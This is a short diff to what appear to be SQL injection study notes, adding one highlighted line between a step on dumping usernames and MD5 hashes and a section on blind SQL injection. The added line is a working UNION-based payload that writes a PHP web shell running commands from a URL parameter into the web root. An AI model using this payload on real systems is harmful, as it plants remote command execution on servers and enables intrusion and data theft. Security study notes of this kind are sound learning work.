@@ -1651,6 +1651,9 @@ retrieve the columns table from the `information_schema database` belonging to t
 ![image](https://hackmd.io/_uploads/SkugTUV7ke.png)
 > fetch the usernames and **MD5 hashes** of the entire users table
 
+>[!Important]
+> `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
+
 #### - Blind SQL Injections
 database responses are never returned and behavior is inferred using either boolean- or time-based logic            
             
